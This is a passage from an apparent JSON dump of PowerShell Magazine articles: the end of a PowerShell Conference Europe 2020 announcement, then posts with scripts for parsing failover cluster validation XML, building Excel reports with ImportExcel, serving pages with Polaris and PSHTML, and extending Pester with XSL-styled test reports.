yummy freshly cooked food, classical and vegetarian. Fresh fruits and biscuits in the afternoon. And big rooms with fresh air. – On-Premises AND Cloud: PowerShell was born on-premises but is now also in the cloud. The word “also” matters to us: cloud and DevOps turned into buzz words with many focusing entirely on these while increasingly neglecting “on-premises”. Not for us: you find sophisticated sessions and experts both for on-premises tasks and cloud tasks, so you can pick what matters to you and learn new skills where appropriate.\n While we love “the latest \u0026amp; greatest”, solid knowledge for realistic every-day tasks and topics are just as important and part of the agenda.\n– Evening Event: Over the years we watched delegates personally grow and becoming experts in their area, so this event is not unidirectional and just about the 40 renown speakers but also about the 300 delegates: interacting, discussing, exploring, and learning from each other are key, including networking and building professional international relationships.\nBeyond the technical sessions at daytime, we organize an official evening event to kick things off, to “break the ice” and provide the setting to get to know each other. It’s perfectly OK to just eat and drink, or just listen. However, if you attend the conference all by yourself and are open to get to know new people, you definitely can.\nThis year, we\u0026rsquo;ll be at castle Königsworth, an ancient city castle with a big hall and a number of smaller rooms including the bar and fireplace room, perfect for hanging lose, discussing PowerShell ideas, or founding new user groups. Dinner and drinks included.\nOn the following days, typically groups form on their own and successfully tackle Hannover night life independently. – Authoritative First-Hand Information: Get authoritative firsthand information from the people making PowerShell and the services around it.\n – PowerShell inventor Jeffrey Snover will be with us again, as is part of the PowerShell Team around Steve Lee and Joey Aiello.\n – We welcome Bruce Payette, the key developer of Windows PowerShell, and Christoph Bergmeister, one of the open-source contributors to both PowerShell 7 and the VSCode extension.\n – Amazon (AWS) sends Angel Calvo, a former PowerShell Manager and now General Manager at Amazon Web Services.\n – Microsoft Germany sends Miriam Wiesner, security program manager for Microsoft Defender ATP, and Friedrich Weinmann, a premier field engineer for security. Both talk about securing PowerShell and your enterprise.\n– Community: PowerShell is driven by a vibrant, creative and very friendly community. If you are already a member of a PowerShell user group, you know how caring the ecosystem is and how the community shares work through modules, blog posts, podcasts, and more. So psconf.eu is the annual place to meet in person, think up new plans, and just hang out and relax among people that share the passion.\n If this community is still new to you, psconf.eu is a perfect starting place to meet the gang and many of the key members in person, find a user group near you, or get help founding one yourself. Don’t worry to attend this event if you feel you are a bit shy. You never walk alone (unless you want to), and there are plenty of opportunities to get connected.\n– Session Recordings: A significant amount of effort each year goes into session recordings. We don’t turn the conference into a huge video tutorial but want to make sure each attendee can recap sessions with a video. We make all of these videos freely available (https://www.youtube.com/channel/UCxgrI58XiKnDDByjhRJs5fg) after the conference on a best-effort basis. They can’t capture the many discussions, side events and personal talks. But they are very helpful to rewind through some of the topics and sessions and refresh the memory.\nSessions Below please find the preliminary agenda. There are still some blind spots while we are waiting for the PowerShell Team to finalize their sessions. Since PowerShell 7 is released this year, you can guess some of their topics.\nClick a session to open a popup with the session abstract!\n A month prior to the conference when the agenda is finalized, we make available a conference app that you can use to start building your personal agenda and navigate the sessions during the conference.\nCommunity Module Authors Chances are you are using community-authored PowerShell modules in your daily work.\nBelow is a quick list of popular PowerShell modules published by this year’s speakers. psconf.eu would be an excellent time to meet their creators, ask questions, toss in ideas, or just say “thank you”:\n– Universal Dashboard: Adam Driscoll is with us this year and presents his Universal Dashboard (https://www.powershellgallery.com/packages/UniversalDashboard) to create breath-taking web-based helpdesk UIs. He’s also an expert for building your own PowerShell hosts and has created the PowerShell extension for Visual Studio (https://marketplace.visualstudio.com/items?itemName=AdamRDriscoll.PowerShellToolsforVisualStudio2017-18561). One of his lesser known PowerShell modules is Snek (https://www.powershellgallery.com/packages/snek), a wrapper around Python for .NET.\n– TypeToUml: Anthony Allen has created TypeToUml (https://www.powershellgallery.com/packages/TypeToUml) to create UML diagrams from .NET types and in his talks sheds lights on PowerShell scoping and plenty of reusable code to not have to reinvent the wheel all the time.\n– EzLog: Arnaud Petitjean makes well-formatted PowerShell logs a snap with EzLog (https://www.powershellgallery.com/packages/EZLog) and shares freely his module KeeRest (https://github.com/apetitjean/KeeRest) to expose a KeePass database via a Rest API. He’s from France and has published a number of French books on PowerShell. At the conference, he focuses on secret management: how to build a secure Rest API to expose passwords, and how to manage access permissions.\n– ArmHelper: Barbara Forbes published ArmHelper (https://www.powershellgallery.com/packages/ARMHelper) which provides functions to help with the deployment of ARM templates. Barbara is an Office365 and Azure expert and shares her know-how at 4bes.nl. Her talks at the conference help you discover Azure PowerShell Functions and find out how you can run some of your PowerShell tasks in the cloud.\n– PSScriptAnalyzer: Christoph Bergmeister is one of the master minds behind the PSScriptAnalyzer that analyzes PowerShell code in real-time and is responsible for squiggle lines in VSCode. If you ever wanted to extend the cleverness of this engine, or add your own rules and have the engine check your corporate PowerShell formatting rules, this is the chance to get the know-how first-hand.\n– PowerShell IoT: Daniel Silva is one of the most prominent PowerShell IoT lovers and with his module (https://github.com/PowerShell/PowerShell-IoT) illustrates how to use PowerShell to control devices and build your own smart home. At the conference, Daniel helps you expand your skills in two directions: learn more about IoT, and embrace C# even if you are not a developer and happy with scripting.\n– RDExSessionInfo: Evgenij Smirnov created RDExSessionInfo (https://www.powershellgallery.com/packages/RDExSessionInfo) to get extended information on RDS sessions. At the conference, he talks about consuming low-level APIs to extend PowerShell’s capabilities.\n– Kubectl: if you never heard of “Kubectl” or Kubernetes (https://kubernetes.io/docs/reference/kubectl/overview/), then Felix Becker and his module PSKubectl (https://www.powershellgallery.com/packages/PSKubectl) may be a great starting point: kubectl is the command line to manage Kubernetes which is becoming the industry standard to orchestrate container deployments. PSKubectl wraps this inside PowerShell. If this made you curious, join Felix’ talk about PSKubectl. If containers and clusters aren’t yours, join Felix shedding light on the secret treasures of the PowerShell formatting system.\n– MicrosoftGraphAPI: Jakob Gottlieb Svendsen is our LEGO robot specialist with many more talents. He wrote MicrosoftGraphAPI (https://www.powershellgallery.com/packages/MicrosoftGraphAPI) to manage the Microsoft Graph functionality from PowerShell. At the conference, he’ll be talking about PowerShell on Raspberry Pi, and the making of his Azure-connected green house.\n– ImportExcel: James O’Neill (working with Doug Finke) has probably created the single most useful community module there is: ImportExcel (https://www.powershellgallery.com/packages/ImportExcel) makes importing and exporting Excel data/xlsx files a snap and does not even require Office to be installed.\n James talks about becoming a PowerShell parameter Ninja, and on how to use multithreading in PowerShell to speed up tasks and do them in parallel, using his module Start-Parallel (https://www.powershellgallery.com/packages/Start-parallel).\n– PSVersion: Ever wanted to turn the PowerShell version number into a meaningful friendly name? Then use PSVersion (https://www.powershellgallery.com/packages/PSVersion) from Jan Egil Ring!\nIn his talks, Jan focuses on Azure Functions in a hybrid world, and Azure Policy Guest Configuration which in some respect works like Group Policies in the cloud and across domains and platforms.\n– ADCSTemplateParser: Senior cloud architect Jan-Henrik Damaschke created ADCSTemplateParser (https://www.powershellgallery.com/packages/ADCSTemplateParser). He also worked on asynchronous PowerShell logging (https://www.itinsights.org/PowerShell-async-logging/) which is highly interesting: don’t let writing logs slow down or block your scripts! He’s explaining his module and concepts at one of his talks. His second talk focuses on real-time communication (basically the stuff done by messengers like WhatsApp) via SignalR and Azure Functions.\n– PowerForensics: Security expert Jared Atkinson published PowerForensics (https://www.powershellgallery.com/packages/PowerForensics), a digital forensics framework for PowerShell. At the conference, Jared talks about detection engineering to uncover hacker techniques, and ways for enterprises to approach intrusion detections and responses at scale.\n– Pester: This module is so important, it is part of Windows. The latest version is available at https://www.powershellgallery.com/packages/Pester. Pester is maintained by Jakub Jareš and is a PowerShell testing framework to make sure a script does what it is supposed to do, and won’t break when you add new things to it. At the conference, Jakub introduces version 5. If you have any question about Pester, make sure you bring it.\n– ArcAdminTools: Co-founder of the Polish PowerShell user group Mateusz Czerniawski has published a collection of useful admin tools called ArcAdminTools (https://www.powershellgallery.com/packages/ArcAdminTools). At the conference, he talks about Azure Log Analytics (ALA) and sheds light on Microsoft Graph and what you can do with it.\n– AADInternals: Dr. Nestori Syynimaa is a leading Office365 expert and has created AADInternals (https://www.powershellgallery.com/packages/AADInternals): It utilizes several internal features of Azure Active Directory, Office 365, and related admin tools and can be used as a Azure AD hacking and pen-testing tool. With his intimate knowledge of Azure and Office365, Nestori talks about Azure AD security and how it can be attacked and abused.\n– cChoco: Paul Broadwith is a DSC expert and has created the extremely successful cChoco (https://www.powershellgallery.com/packages/cChoco) DSC resource to use Chocolatey with DSC. At the conference, Paul is tackling two extremely hot topics: using SSH for remoting instead of WinRM, and how to automate the setup of brand-new computer hardware using Boxstarter.\n– PSWriteColor: Przemysław Kłys is a “discovery” of last year’s psconf.eu. He had never talked before at large conferences, yet his sessions rocked last year. Meanwhile, he is a regular speaker at large conferences and has published a great number of modules (https://www.powershellgallery.com/profiles/Przemyslaw.Klys), for example PSWriteColor (https://www.powershellgallery.com/packages/PSWriteColor): a wrapper around Write-Host to create beautiful colored output. At this year’s conference, he’ll use his set of free tools to create Active Directory and Office365 auto-documentation to word, excel, and HTML. Definitely a must-see.\n– DBAchecks: Rob Sewell co-authored DBAchecks (https://www.powershellgallery.com/packages/dbachecks) together with Chrissy LeMaire: A testing framework for SQL Server to ensure it is (and continues to be) compliant with your requirements. And as a database admin, of course you’ll know dbatools (https://www.powershellgallery.com/packages/dbatools), the community tool filled with commands to easily automate database deployment and administration. Rob was in charge of the psconf.eu call for papers and manages the speakers. At the conference, he is talking about PowerShell Notebooks, part of Azure Data Studio, and how useful they can be for you.\n– PSHTML: Stephane van Gulick defines himself in one sentence: “I love computers”. He is into DevOps, but also into HTML. His module PSHTML (https://www.powershellgallery.com/packages/PSHTML) can be used to create stunning reports and build entire responsive websites. At the conference he’s sharing how he discovered PowerShell classes and how you could benefit from classes, too.\n– ISESteroids: Dr. Tobias Weltner originally created ISESteroids (https://www.powershellgallery.com/packages/ISESteroids) to make his life easier while adding missing functionality to the built-in PowerShell ISE. Soon, public interest turned this into a commercial-grade product for anyone working with Windows PowerShell and the PowerShell ISE. Tobias has started the psconf.eu conference and lives in Hannover.\nBook Signing Many of us have learned PowerShell using books, and we are humbled to have a number of renown PowerShell book authors from around the world with us. If you have learned by reading one of the books below, and still own your copy, bring it to have it signed by the author:\n– Windows PowerShell 5.1 Biblia\n PowerShell Deep Dives\n Bartek Bielawski talks about PowerShell classes and how you can author DSC resources with it. He also helps you find your way into Git and as a team work with scripts in a safe and structured way.\n– PowerShell Core et Windows PowerShell\n Windows PowerShell : Fonctionnalités avancées\n Windows PowerShell : Guide de référence pour l’administration système\n PowerShell Deep Dives\n Arnaud Petitjean talks about managing secrets such as passwords and access permissions\n– PowerShell in Action\n Bruce Payette is a founding member of the PowerShell team and now with AWS. At the conference, Bruce will explain some of the more mysterious moving parts of the PowerShell architecture like PSHost, threads, and runspace pools. He’ll focus on how they work and how they differ in remoting, and if you ever attended one of his talks, you know the tons of practical and undocumented tricks that come with it.\n– Windows PowerShell 5 – kurz und gut\n Thorsten Butz is a PowerShell trainer and “on-premises” fan, and at the conference talks about querying Wikidata with a glimpse of SPARQL.\n– PowerShell 5: Windows-Automation für Einsteiger und Profis\n Windows PowerShell: Grundlagen \u0026amp; Scripting-Praxis für Einsteiger – alle Versionen\n  Dr. Tobias Weltner is running psconf.eu and delivering PowerShell trainings throughout Europe.\nGet Your Seat! Don’t wait for too long and get your seat! In the past three years, psconf.eu sold out every time.\nTo sign up and reserve your seat, or to get a proposal for your boss, please visit the registration page (https://psconf.eu/register.html).\nSigning up early has a number of advantages (for us, but also for you):\n  Hotel accommodation is still reasonable, and there is a variety of flights available to Hannover Airport\n  You have the guarantee to get a seat\n  We are working on a PowerShell delegate jacket. Obviously, the jacket needs to go to production at some time. Anyone signing up until March 15 gets his or her guaranteed jacket size. We order jackets based on gender, so yes the jackets do look good for female delegates as well! Of course, we do our best in extrapolating jacket sizes and types for the rest but anyone signing up later gets a best-effort jacket size and type.\n  Signing up early makes life for us a lot easier.\n  What if you signed up early and can’t come? While conference tickets are never refundable (or else a conference would be impossible to organize), they are transferrable at no cost.\nWe are looking forward to seeing you at the PowerShell Conference Europe 2020!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2020/01/30/powershell-conference-europe-2020/","tags":["Conferences"],"title":"PowerShell Conference Europe 2020"},{"categories":["FailoverCluster"],"contents":"If you have ever worked with the Test-Cluster command in the failover clustering module, you will know that this command generates an HTML report. This is visually good, for like IT managers, but not very appealing to people are automating infrastructure build process. There is no way this command provides any passthru type of functionality through which it returns the result object that can be easily parsed or used in PowerShell.\nAs a part of some larger automation that I was building, I needed to parse the validation result into a PowerShell object that can be used later in the orchestration. Parsing HTML isn’t what I needed but a little of digging gave some clues about the XML report that gets generated when we run this command.\nBehind the scenes, the Test-Cluster command generates an XML every time it was run. This XML gets stored at C:\\Windows\\Temp. Looking at the XML you can easily notice that the schema was really designed to generate the HTML easily. So, it took a few minutes to understand how the tests are categorized and come up with the below script.\n[CmdletBinding()] param ( [Parameter(Mandatory = $true)] [String] $ValidationXmlPath ) $xml = (Get-Content -Path $ValidationXmlPath) $channels = $xml.Report.Channel.Channel $validationResultArray = New-Object -TypeName System.Collections.ArrayList foreach ($channel in $channels) { if ($channel.Type -eq \u0026#39;Summary\u0026#39;) { $channelSummaryHash = [PSCustomObject]@{} $summaryArray = New-Object -TypeName System.Collections.ArrayList $channelId = $channel.id $channelName = $channel.ChannelName.\u0026#39;#cdata-section\u0026#39; foreach ($summaryChannel in $channels.Where({$_.SummaryChannel.Value.\u0026#39;#cdata-section\u0026#39; -eq $channelId})) { $channelTitle = $summaryChannel.Title.Value.\u0026#39;#cdata-section\u0026#39; $channelResult = $summaryChannel.Result.Value.\u0026#39;#cdata-section\u0026#39; $channelMessage = $summaryChannel.Message.\u0026#39;#cdata-section\u0026#39; $summaryHash = [PSCustomObject] @{ Title = $channelTitle Result = $channelResult Message = $channelMessage } $null = $summaryArray.Add($summaryHash) } $channelSummaryHash | Add-Member -MemberType NoteProperty -Name Category -Value $channelName $channelSummaryHash | Add-Member -MemberType NoteProperty -Name Results -Value $summaryArray $null = $validationResultArray.Add($channelSummaryHash) } } return $validationResultArray The input to the above script is the XML file that gets generated at C:\\Windows\\Temp. Once you run the script, you should see the output similar to what is shown below.\nI have only added the property values that I really need in my scripts but you can look at the XML and then easily modify the above script to add other details as you need.\nComment on this Gist if you have any suggestions or have you version of the script.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2020/01/30/parsing-failover-cluster-validation-report-in-powershell/","tags":["Scripts"],"title":"Parsing Failover Cluster Validation Report in PowerShell"},{"categories":["Module Spotlight","ImportExcel"],"contents":"In my previous job, I worked at a customer site that had multiple Windows and Unix Servers. One of the every day tasks was to report the disk space utilization from these servers. When I joined the customer site, engineers there used to collect the statistics manually and create an Excel spreadsheet manually. This was not just time consuming but boring as well. This task is something that needs to be automated. Period.\nSo, I went on to create a rather long VBScript that uses WMI for collecting disk usage statistics from Windows servers and uses Excel COM object to generate spreadsheets that contain the reports. It certainly made my job easy. I just had to run this sitting at my local workstation and within a few seconds I would have the Excel report that I can mail to the IT manager.\nBut, those of you who worked on Excel COM objects and PowerShell would know that it is not the best thing. Working with VBScript is a pain. When that combined with COM object, the pain of writing and testing a script increases a few folds.\nYou would be glad to hear that you don’t have to do that anymore if you know PowerShell even a little bit. Thanks to ImportExcel.\nImportExcel allows you to read and write Excel files without installing Microsoft Excel on your system. With this module, there is no need to bother with the cumbersome Excel COM-object. With ImportExcel, creating Tables, Pivot Tables, Charts and much more has becomes a lot easier.\nBefore you try any of the following examples, install ImportExcel module from the PowerShell Gallery\nHere is the simple first example for you!\nGet-Process | Select-Object Company, Name, Handles | Export-Excel This a command exports the values of selected properties from the process object and opens an Excel spreadsheet automatically.\nHere is another example from ImportExcel GitHub repository that generates charts.\n$xlfile = \u0026#34;$env:TEMP\\trendLine.xlsx\u0026#34; Remove-Item $xlfile -ErrorAction SilentlyContinue $data = ConvertFrom-Csv @\u0026#34; Region,Item,TotalSold West,screws,60 South,lemon,48 South,apple,71 East,screwdriver,70 East,kiwi,32 West,screwdriver,1 South,melon,21 East,apple,79 South,apple,68 South,avocado,73 \u0026#34;@ $cd = New-ExcelChartDefinition -XRange Region -YRange TotalSold -ChartType ColumnClustered -ChartTrendLine Linear $data | Export-Excel $xlfile -ExcelChartDefinition $cd -AutoNameRange -Show Finally, here is something I showed at the PowerShell Conference Europe 2019. This uses the speaker and session data JSON and generates a spreadsheet.\nif (-not (Get-Module -ListAvailable -Name ImportExcel -ErrorAction SilentlyContinue)) { Install-Module -Name ImportExcel -Force } $speakersJson = \u0026#39;https://raw.githubusercontent.com/psconfeu/2019/master/data/speakers.json\u0026#39; $sessionsJson = \u0026#39;https://raw.githubusercontent.com/psconfeu/2019/master/sessions.json\u0026#39; $speakers = ConvertFrom-Json (Invoke-WebRequest -UseBasicParsing -Uri $speakersJson).content $sessions = ConvertFrom-Json (Invoke-WebRequest -UseBasicParsing -Uri $sessionsJson).content All Sessions Sheet $sessions | Select-Object Name, Starts, Ends, Track, Speaker | Export-Excel -Path .\\psconfeu2019.xlsx -WorksheetName \u0026#39;All Tracks\u0026#39; ` -Title \u0026#39;PowerShell Conference EU 2019 - Sessions\u0026#39; ` -TitleBold -TitleFillPattern DarkDown -TitleSize 20 ` -TableStyle Medium6 -BoldTopRow Track sheets foreach ($i in 1..3) { $trackSessions = $sessions.Where({$_.Track -eq \u0026#34;Track $i\u0026#34;}) $trackSessions | Select-Object Name, Starts, Ends, Speaker | Export-Excel -Path .\\psconfeu2019.xlsx -WorksheetName \u0026#34;Track $i\u0026#34; ` -Title \u0026#39;PowerShell Conference EU 2019 - Track $i\u0026#39; ` -TitleBold -TitleFillPattern DarkDown -TitleSize 20 ` -TableStyle Medium6 -BoldTopRow } Add Speakers sheet $speakers | Export-Excel -Path .\\psconfeu2019.xlsx -WorksheetName \u0026#39;Speakers\u0026#39; ` -Title \u0026#39;PowerShell Conference EU 2019 - Speakers\u0026#39; ` -TitleBold -TitleFillPattern DarkDown -TitleSize 20 ` -TableStyle Medium6 -BoldTopRow Add chart for speaker country number $chartDef = New-ExcelChart -Title \u0026#39;PowerShell Conference EU 2019 - Speakers\u0026#39; ` -ChartType ColumnClustered ` -XRange Name -YRange Count ` -Width 800 -NoLegend -Column 3 $speakers | Group-Object -Property Country | Select-Object Name, Count | Sort-Object -Property Count -Descending | Export-Excel -path .\\psconfeu2019.xlsx -AutoSize -AutoNameRange -ExcelChartDefinition $chartDef -WorksheetName SpeakerCountryChart -Show There are many other ways you can use this module in creating report dashboards. The GitHub repository contains several examples that you can use as a starting point.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/09/09/weekly-module-spotlight-importexcel/","tags":["Modules"],"title":"Weekly Module Spotlight: ImportExcel"},{"categories":["Module Spotlight","Polaris"],"contents":"I create HTTP REST APIs a lot in my proof-of-concept work and I generally use the .NET HTTPListener class for this purpose. Using this class we can create simple and programmatically controlled HTTP listeners. For some quick prototype this totally makes sense as it is inbox and there is no need for any external modules or libraries. However, creating complex endpoints won’t be easy. This is where Polaris plays a role.\nPolaris is a cross-platform, minimalist web framework for PowerShell. This is an experimental module but stable enough to try it out. Before you can try out the examples, install Polaris module from PS Gallery.\nHere is a quick example of how we create a HTTP endpoint.\nNew-PolarisGetRoute -Path \u0026#34;/helloworld\u0026#34; -Scriptblock { $Response.Send(\u0026#39;Hello World!\u0026#39;) } Start-Polaris Once these commands are executed, if you access http://localhost:8080/helloworld in a browser, you will see ‘Hello World!’ returned as response. In the above example, there is just one endpoint or route. This implements HTTP GET method. Whenever this route gets accessed, the PowerShell commands specified as an argument to -Scriptblock parameter gets invoked. In this example, we are just using the $Response automatic variable that Polaris provides and use the .Send() method to send the response back to browser.\nSimilar to this, you can create other HTTP routes as well for POST, PUT, DELETE, and so on. In the next example, you will see how we can combine what PSHTML provides with Polaris.\nSave the following script as content.ps1 in a folder of your choice.\nhtml { head { title \u0026#34;Example 2\u0026#34; } body { h1 {\u0026#34;This is just an example of using PSHTML as view engine for Polaris\u0026#34;} $Languages = @(\u0026#34;PowerShell\u0026#34;,\u0026#34;Python\u0026#34;,\u0026#34;CSharp\u0026#34;,\u0026#34;Bash\u0026#34;) \u0026#34;My Favorite language are:\u0026#34; ul{ foreach($language in $Languages){ li { $Language } } } } Footer { h6 \u0026#34;This is h1 Title in Footer\u0026#34; } } The following script is the route that we need to create for displaying the HTML content from the above script.\nNew-PolarisGetRoute -Path \u0026#34;/languages\u0026#34; -Scriptblock { $response.SetContentType(\u0026#39;text/html\u0026#39;) $html = . \u0026#34;C:\\scripts\\content.ps1\u0026#34; $response.Send($html) } Start-Polaris -Port 8080 Once you start Polaris and load the routes, you can access http://localhost:8080 to see the content generated from a PS1 script. It should be like this!\nHope you got a hang of what you can achieve with PSHTML and Polaris combined. I have built dashboards with simply this combination and nothing more. In the future posts, I will show one such example from my demo at PowerShell Conference Europe 2019.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/09/03/weekly-module-spotlight-polaris/","tags":["Modules"],"title":"Weekly Module Spotlight: Polaris"},{"categories":["Module Spotlight","PSHTML"],"contents":"Ever wanted to generate HTML documents dynamically? Until now, you had to statically code the HTML tags in the PowerShell scripts and ensure you open and close all needed HTML elements. Very cumbersome, tedious, and not very efficient.\nDo that no more! PSHTML is here.\nPSHTML is a cross platform PowerShell module to generate HTML markup language within a DSL on Windows and Linux.\nWith PSHTML, you can write HTML documents the same way you write PowerShell scripts. You can use every possible language artifact and generate HTML code dynamically based on the input and context. Let us see a quick example!\nBefore you go forward and try out the example below, install the module from the PS Gallery.\nhtml { head { title \u0026#39;This is a test HTML page\u0026#39; } body { h2 \u0026#39;PSHTML is cool!\u0026#39; p { \u0026#39;Using PSHTML, offers code completion and syntax highlighting from the the default powershell language.\u0026#39; \u0026#39;As PSHTML respects the W3C standards, any HTML errors, will be spotted immediately.\u0026#39; } } footer { p { \u0026#39;This is footer. All credits reserved to PSHTML\u0026#39; } } } This generates the following HTML text.\nThis is very easy. Let us give it some styles.\nhtml { head { title \u0026#39;This is a test HTML page\u0026#39; } body { h2 \u0026#39;PSHTML is cool!\u0026#39; -Style \u0026#39;color:blue;background-color:powderblue\u0026#39; p -Style \u0026#39;color:red\u0026#39; { \u0026#39;Using PSHTML, offers code completion and syntax highlighting from the the default powershell language.\u0026#39; \u0026#39;As PSHTML respects the W3C standards, any HTML errors, will be spotted immediately.\u0026#39; } } footer { p -Style \u0026#39;color:green\u0026#39; { \u0026#39;This is footer. All credits reserved to PSHTML\u0026#39; } } } This results in a HTML page as shown below!\nThis is all good but very trivial. Let us try generating some tables and we will use bootstrap for styles.\nhtml { head { title \u0026#39;Top 5 Processes - HTML report Powered by PSHTML\u0026#39; Link -href \u0026#39;https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\u0026#39; -rel \u0026#39;stylesheet\u0026#39; script -src \u0026#39;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\u0026#39; -type \u0026#39;text/javascript\u0026#39; script -src \u0026#39;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\u0026#39; -type \u0026#39;text/javascript\u0026#39; script -src \u0026#39;https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\u0026#39; -type \u0026#39;text/javascript\u0026#39; } body { $topFiveProcess = Get-Process | Sort CPU -descending | Select -first 5 -Property ID,ProcessName,CPU div -Content { table -class \u0026#39;table table-striped\u0026#39; { thead { tr { th { ID } th { ProcessName } th { CPU } } } Tbody { foreach ($process in $topFiveProcess) { tr { td { $process.id } td { $process.Name } td { $process.CPU } } } } } } } footer { p -Class \u0026#39;lead\u0026#39; -Content \u0026#39;All Credits Reserved. PSHTML!\u0026#39; } } This results in a nice table shown below!\nSee how easy was that!? I will stop this article here as this is not a PSHTML tutorial. Hope you have got a good idea about how useful the module is. There are several community members who did some great work with PSHTML. Check out their work as well.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/08/21/weekly-module-spotlight-pshtml/","tags":["Modules"],"title":"Weekly Module Spotlight: PSHTML"},{"categories":["DevOps","Pester"],"contents":"I believe there is no introduction required for pester in PowerShell community. If you have never heard of Pester, this is the place to go first.\nThis article uses a custom version of Pester which is not an official version yet. This custom version of Pester with these changes is currently available here.\nPester is used both as an unit testing framework as well as an operational validation tool. In both the use cases, output report plays an important role in presenting the test results. This article is about the output report with and added capability.\nBelow is a Pester test script with few tests.\nparam( [Parameter(Mandatory = $True)] [string]$ConfigPath ) $Config = Get-Content -Path $ConfigPath | ConvertFrom-Json Describe \u0026#34;Describing validation tests post deployment\u0026#34; { Context \u0026#34;Post deployment validation tests for services\u0026#34; { BeforeAll { $Config.service.expectedconfiguration | ForEach-Object -Process { $Name = $_.Name $Status = $_.Status $StartMode = $_.StartMode $Service = Get-Service -Name $Name it \u0026#34;Service $Name status should be $Status\u0026#34; { $Service.Status | Should -Be $Status } it \u0026#34;Service $Name startmode should be $StartMode\u0026#34; { $Service.StartType | Should -Be $StartMode } } } } Context \u0026#34;Post deployment validation tests for folder permission\u0026#34; { $Config.folderpermission.expectedconfiguration | ForEach-Object -Process { $User = $_.user $Permission = $_.permission $Path = $_.path it \u0026#34;user $User should have $Permission permission on path $Path\u0026#34; { $Access = (Get-Acl -Path $Path).Access | Where-Object -FilterScript { $_.IdentityReference -eq $User } $Access.FileSystemRights | Should -Contain $Permission } } } Context \u0026#34;Post deployment validation tests for firewall rule\u0026#34; { $Config.firewallrule.expectedconfiguration | ForEach-Object -Process { $Rulename = $_.rulename $Direction = $_.direction $Rule = Get-NetFirewallRule -Name $RuleName -ErrorAction SilentlyContinue it \u0026#34;A Firewall rule with name $RuleName should be available\u0026#34; { $Rule | Should -Not -BeNullOrEmpty } it \u0026#34;Firewall rule $RuleName should be allowed for $Direction connection\u0026#34; { $Rule.Direction | Should -Not $Direction } } } } Data for above test script is shown below.\n{ \u0026#34;service\u0026#34;: { \u0026#34;suggestion\u0026#34;: { \u0026#34;startmode\u0026#34;: \u0026#34;Open PowerShell as administrator and run \u0026#39;Set-Service -Name {0} -StartType {1}\u0026#39;\u0026#34;, \u0026#34;status\u0026#34;: \u0026#34;Make the service \u0026#39;{0}\u0026#39; in {1} state.\u0026#34; }, \u0026#34;expectedconfiguration\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;BITS\u0026#34;, \u0026#34;status\u0026#34;: \u0026#34;running\u0026#34;, \u0026#34;startmode\u0026#34;: \u0026#34;automatic\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;wuauserv\u0026#34;, \u0026#34;status\u0026#34;: \u0026#34;running\u0026#34;, \u0026#34;startmode\u0026#34;: \u0026#34;automatic\u0026#34; } ] }, \u0026#34;folderpermission\u0026#34;: { \u0026#34;suggestion\u0026#34;: { \u0026#34;message\u0026#34;: \u0026#34;Give {0} permission for {1} user on {2} folder.\u0026#34; }, \u0026#34;expectedconfiguration\u0026#34;: [ { \u0026#34;path\u0026#34;: \u0026#34;c:\\\\Deployment\\\\config\u0026#34;, \u0026#34;user\u0026#34;: \u0026#34;RDFC\\\\Test\u0026#34;, \u0026#34;permission\u0026#34;: \u0026#34;FullControl\u0026#34; }, { \u0026#34;path\u0026#34;: \u0026#34;c:\\\\Deployment\\\\files\u0026#34;, \u0026#34;user\u0026#34;: \u0026#34;RDFC\\\\kvprasoon\u0026#34;, \u0026#34;permission\u0026#34;: \u0026#34;FullControl\u0026#34; } ] }, \u0026#34;firewallrule\u0026#34;: { \u0026#34;suggestion\u0026#34;: { \u0026#34;rulename\u0026#34;: \u0026#34;Open wf.msc and create an {0} rule with name \u0026#39;{1}\u0026#39;.\u0026#34;, \u0026#34;direction\u0026#34;: \u0026#34;Open wf.msc and create the firewall rule \u0026#39;{0}\u0026#39; for {1} connection.\u0026#34; }, \u0026#34;expectedconfiguration\u0026#34;: [ { \u0026#34;rulename\u0026#34;: \u0026#34;Rule1\u0026#34;, \u0026#34;direction\u0026#34;: \u0026#34;Inbound\u0026#34; }, { \u0026#34;rulename\u0026#34;: \u0026#34;Rule2\u0026#34;, \u0026#34;direction\u0026#34;: \u0026#34;Outbound\u0026#34; } ] } } In a nutshell, the above pester test script will test Service status, file system permissions, and firewall rules by reading the data from the JSON configuration file.\nYou can execute the test as shown below.\nInvoke-Pester -Script @{Path = \u0026#39;C:\\temp\\OpsValidation.tests.ps1\u0026#39; ; Parameters = @{ConfigPath = \u0026#39;c:\\temp\\OpsValidationConfig.json\u0026#39;}} This will show the test result in the console with summary.\nWhen comes to the reporting side, Invoke-Pester has parameters which will create a [nunit][1] based XML test result file. Nunit XML reports are mostly rendered using a report reader or by converting it to html format. There are many tools in the market that convert Nunit XML to nice UI reports. [Reportunit][2] (now [extent-reports][3]) is my favorite. But this tool uses jquery and CSS which are referenced online, hence made me to think about adding this capability to Pester. Since the report is in XML format, my choice was to go with [XSLT][4]. In short, XSL is a steroid for XML. This article doesn’t cover anything on how it transforms XML to HTML. [Here][5] is a simple example for creating an XSL targeting an XML. Now we know that XSL can transform an XML to HTML but how to add this in the Nunit report generated by Pester. This is done by adding a new parameter to accept the XSL path and putting it as a stylesheet reference in XML generated by pester. I’ve named the parameter as –XSLPath. Below is an example execution with the XSL path.\nInvoke-Pester -Script @{Path = \u0026#39;C:\\temp\\OpsValidation.tests.ps1\u0026#39; ; Parameters = @{ConfigPath = \u0026#39;c:\\temp\\OpsValidationConfig.json\u0026#39;}} -OutputFile c:\\temp\\OpsValidation.xml -OutputFormat NUnitXml -XSLPath c:\\temp\\OpsValidation.xsl Once executed, open the XML report using a web browser to see the magic !\nSo far so good! But here comes the interesting part of this article.\nWe are now able to have a report in html, hence it is easy to see the test failures (human beings are interested in analyzing failures than success !) in a web browser. How about adding some 